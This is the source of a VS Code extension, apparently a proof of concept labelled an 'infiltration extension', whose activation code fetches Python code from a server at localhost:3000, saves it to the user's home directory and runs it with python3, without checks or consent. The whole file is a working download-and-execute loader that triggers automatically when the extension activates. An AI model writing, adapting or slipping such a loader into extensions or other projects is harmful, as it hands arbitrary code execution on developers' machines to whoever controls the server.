import * as vscode from 'vscode';
import * as fs from 'fs';
import * as os from 'os';
import { exec } from 'child_process';

export async function activate(context: vscode.ExtensionContext) {
	vscode.window.showInformationMessage('infiltration extension activated!');

    const url = 'http://localhost:3000/data';

    try {
        // Fetch the Python file using built-in fetch
        const response = await fetch(url);
        if (!response.ok) {
            vscode.window.showErrorMessage(`Failed to fetch file: ${response.statusText}`);
            return;
        }

        const pythonCode = await response.text();

        // Get the home directory of the user
        const homeDir = os.homedir();
        if (!homeDir) {
            vscode.window.showErrorMessage('Unable to determine the home directory.');
            return;
        }

        // Define the file path to save the Python file
        const filePath = `${homeDir}/fetched_file.py`;

        // Save the Python file locally
        fs.writeFileSync(filePath, pythonCode);
        vscode.window.showInformationMessage(`Python file saved to ${filePath}`);

        // Execute the Python file
        exec(`python3 ${filePath}`, (error, stdout, stderr) => {
            if (error) {
                vscode.window.showErrorMessage(`Execution failed: ${error.message}`);
                return;
            }
            if (stderr) {
                vscode.window.showErrorMessage(`Execution error: ${stderr}`);
                return;
            }
            vscode.window.showInformationMessage(`Execution output: ${stdout}`);
        });
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error: ${error.message || error}`);
    }
}

export function deactivate() {}
